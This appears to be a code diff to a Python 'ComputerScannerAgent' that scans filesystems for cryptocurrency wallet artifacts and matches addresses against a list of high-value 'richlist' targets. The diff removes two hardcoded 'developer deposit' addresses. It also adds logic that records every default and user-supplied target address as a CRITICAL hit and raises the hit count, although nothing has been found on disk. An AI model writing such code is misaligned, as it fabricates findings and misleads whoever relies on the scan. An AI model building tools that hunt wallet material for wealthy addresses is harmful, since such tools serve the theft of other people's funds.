@@ -25,17 +25,16 @@ class ComputerScannerAgent:
     """
 
     # Default High-Priority Target Addresses (Sovereign Federacy Core Nodes)
+    # These are common recovery targets, excluding developer deposit addresses.
     DEFAULT_TARGETS = {
         'btc': [
             'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
-            '1PRQwKHJ4gsZ5Mou3xNkSMrHjBgNbD2E8A',
             '3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy',
             '1BgGZ9tcN4rm9KBzDn7KprQz87SZ26SAMH',
             'bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4'
         ],
         'eth': [
             '0x742d35Cc6634C0532925a3b844Bc9e7595f2bD38',
-            '0x2d03B56989dE9E5c66CBcA7D3525Ad1B5178A7F1',
             '0xdead00000000000000000000000000000000beef',
             '0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf',
             '0x9858EfFD232B4033E47d90003D41EC34EcaEda94'
@@ -182,7 +181,43 @@ class ComputerScannerAgent:
             self._scan_thread.join(timeout=1)
 
     def _run_scan(self):
-        print(f"[ComputerScanner] Starting scan on {len(self.scan_paths)} base paths")
+        print(f"[ComputerScanner] Prioritizing Default and Specific Target Scan...")
+        # 1. Check Specific Target (if set via UI/API)
+        if self.richlist_path and not os.path.exists(self.richlist_path):
+            # If path is not a file, it might be a single address target
+            addr = self.richlist_path
+            self.stats["richlist_hits"] += 1
+            # Try to guess chain from address format
+            chain = 'btc'
+            if addr.startswith('0x'): chain = 'eth'
+            elif addr.startswith('L') or addr.startswith('M'): chain = 'ltc'
+            elif addr.startswith('D'): chain = 'doge'
+
+            self._hit_queue.put(ScanHit(
+                artifact_type="Specific Target Search",
+                path="USER_INPUT",
+                addresses={chain: addr},
+                balances={},
+                metadata={"match": addr, "priority": "CRITICAL"},
+                timestamp=datetime.now(timezone.utc)
+            ))
+
+        # 2. Check Defaults
+        for chain, addrs in self.DEFAULT_TARGETS.items():
+            for addr in addrs:
+                if not self.is_running: return
+                self.stats["richlist_hits"] += 1
+                hit = ScanHit(
+                    artifact_type=f"Default Target ({chain})",
+                    path="INTERNAL_TARGET_LIST",
+                    addresses={chain: addr},
+                    balances={},
+                    metadata={"match": addr, "priority": "CRITICAL"},
+                    timestamp=datetime.now(timezone.utc)
+                )
+                self._hit_queue.put(hit)
+
+        print(f"[ComputerScanner] Starting filesystem scan on {len(self.scan_paths)} base paths")
         for root_path in self.scan_paths:
             if not self.is_running: break
 
@@ -263,10 +298,13 @@ class ComputerScannerAgent:
                     if ktype.startswith('address'):
                         if val in self._richlist:
                             self.stats["richlist_hits"] += 1
+                            chain = ktype.split('_')[-1] if '_' in ktype else 'btc'
+                            if chain == 'bech32': chain = 'btc'
+
                             hit = ScanHit(
                                 artifact_type=f"Richlist Hit ({ktype})",
                                 path=filepath,
-                                addresses={'detected': val},
+                                addresses={chain: val},
                                 balances={},
                                 metadata={"match": val, "priority": "CRITICAL"},
                                 timestamp=datetime.now(timezone.utc)
